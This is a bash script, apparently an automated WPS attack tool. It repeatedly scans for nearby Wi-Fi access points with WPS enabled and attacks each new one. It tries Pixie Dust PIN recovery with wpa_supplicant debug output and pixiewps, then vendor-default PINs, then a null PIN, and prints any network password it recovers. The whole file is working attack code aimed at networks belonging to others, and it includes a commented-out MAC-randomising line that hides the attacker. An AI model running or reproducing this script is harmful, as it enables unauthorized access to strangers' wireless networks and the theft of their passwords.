#!/bin/bash

RED='\x1b[31m'
GREEN='\x1b[32m'
GREY='\x1b[90m'
RESET='\x1b[0m'

[ -z "$IFACE" ] && IFACE=wlan0

mkdir /tmp/wps_brute 2> /dev/null && chmod o+rw /tmp/wps_brute

function pixiedust(){
  TIMEOUT=10
  shopt -s lastpipe
  echo -ne $GREY' try pixiedust         \r'$RESET
  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee /tmp/wps_brute/wpa_supplicant.conf > /dev/null
  { sleep 1; sudo /opt/wpa_supplicant/wpa_cli wps_reg "$1" "12345678" > /dev/null; } &
  EnrolleeNonce=''; DHownPublicKey=''; DHpeerPublicKey=''; AuthKey=''; EHash1=''; EHash2='';
  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -d -K -c /tmp/wps_brute/wpa_supplicant.conf | grep --line-buffered -e 'E-Hash' -e 'AuthKey' -e 'Enrollee Nonce' -e 'DH own Public Key' -e 'DH peer Public Key' | while read line
  do #echo "$line"
    if echo "$line" | grep -q 'Enrollee Nonce'; then
      read a b c d e hex <<< $(echo "$line")
      [ -n "$hex" ] && EnrolleeNonce=$(echo "$hex" | tr -d ' ')
    elif echo "$line" | grep -q 'DH own Public Key'; then
      read a b c d e f g hex <<< $(echo "$line")
      [ -n "$hex" ] && DHownPublicKey=$(echo "$hex" | tr -d ' ')
    elif echo "$line" | grep -q 'DH peer Public Key'; then
      read a b c d e f g hex <<< $(echo "$line")
      [ -n "$hex" ] && DHpeerPublicKey=$(echo "$hex" | tr -d ' ')
    elif echo "$line" | grep -q 'AuthKey'; then
      read a b c d hex <<< $(echo "$line")
      [ -n "$hex" ] && AuthKey=$(echo "$hex" | tr -d ' ')
    elif echo "$line" | grep -q 'E-Hash1'; then
      read a b c d hex <<< $(echo "$line")
      [ -n "$hex" ] && EHash1=$(echo "$hex" | tr -d ' ')
    elif echo "$line" | grep -q 'E-Hash2'; then
      read a b c d hex <<< $(echo "$line")
      [ -n "$hex" ] && EHash2=$(echo "$hex" | tr -d ' ')
    fi
  done
  #echo -- pixiewps --pke "$DHpeerPublicKey" --pkr "$DHownPublicKey" --e-hash1 "$EHash1" --e-hash2 "$EHash2" --authkey "$AuthKey" --e-nonce "$EnrolleeNonce"
  pixiewps --pke "$DHpeerPublicKey" --pkr "$DHownPublicKey" --e-hash1 "$EHash1" --e-hash2 "$EHash2" --authkey "$AuthKey" --e-nonce "$EnrolleeNonce" 2> /dev/null | fgrep '[+] WPS pin' | sed -e 's/<empty>//g' | while read _ _ _ pin
  do echo -e $GREEN"[+] $pin             "$RESET
    connect "$1" "$pin"
    return 0
  done
  return 1
}
function vendor_specific(){
  TIMEOUT=10
  echo -ne $GREY' try vendor specific    \r'$RESET
  wpspin "$1" | grep 'Found' -A 100 | sed -n 3,100p | while read pin _
  do echo -ne $GREY" $pin             " '\r'$RESET
    connect "$1" "$pin" && return 0
  done
  return 1
}
function nullpin(){
  echo -ne $GREY' try null pin           \r'$RESET
  connect "$1" '' && return 0
}
function connect(){
  TIMEOUT=10
  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee /tmp/wps_brute/wpa_supplicant.conf > /dev/null
  { sleep 1; sudo /opt/wpa_supplicant/wpa_cli wps_reg "$1" "$2" > /dev/null; } &
  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -c /tmp/wps_brute/wpa_supplicant.conf | while read line
  do
    if echo "$line" | grep -q 'CTRL-EVENT-DISCONNECTED'; then
      break
    fi
  done
  #cat /tmp/wps_brute/wpa_supplicant.conf >&2
  cat /tmp/wps_brute/wpa_supplicant.conf | grep 'psk=' | awk '{print $1}' | while read password
  do
    echo -e $GREEN"[+] ${password:5:-1}       "$RESET
    return 0
  done
  return 1
}

while :
do
  sudo ifconfig $IFACE up
  typeset -a bssids=()
  typeset -a essids=()
  typeset -a signals=()
  echo -ne $GREY'scanning...             \r'$RESET
  IFS=$'\x0a'
  for line in $(sudo iw dev $IFACE scan 2> /dev/null | egrep '^BSS|SSID:|signal:|WPS:' | tr $'\n' $'\t' | sed -e 's/BSS/\nBSS/g' | grep 'WPS')
  do
    IFS=$'\t' read bssid signal essid <<< $(echo "$line" | sed -rn 's/BSS (.+)\(.*\t+signal: (.*).00 dBm.*\t+SSID: ([^\t]+)\t.*/\1\t\2\t\3/p')
    if [ -n "$essid" ]; then
      #echo "[*] $bssid $signal $essid"
      bssids+=($bssid)
      essids+=($essid)
      signals+=($signal)
    fi
  done

  for ((i=0; i<${#bssids[@]}; i++))
  do
    echo "${essids[i]}"$'\t'"${bssids[i]}"$'\t'"${signals[i]}"
  done | sort -n -k 3 -r | uniq > /tmp/wps_brute/wpa_net.txt

  IFS=$'\x0a'
  for net in $(cat /tmp/wps_brute/wpa_net.txt)
  do
    IFS=$'\t' read essid bssid signal <<< $(echo "$net")
    fgrep -q "$essid" /tmp/wps_brute/essids_known.txt 1> /dev/null 2> /dev/null && continue
    echo "[*] $essid $bssid $signal"
    echo "$essid" >> /tmp/wps_brute/essids_known.txt
    IFS=' '
    #sudo ifconfig $IFACE down; sudo ifconfig $IFACE hw ether "00:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]:$[RANDOM%110+10]" 2> /dev/null; sudo ifconfig $IFACE up
    pixiedust $bssid || vendor_specific $bssid || nullpin $bssid
    #connect $bssid '12345678'
    break
  done
done
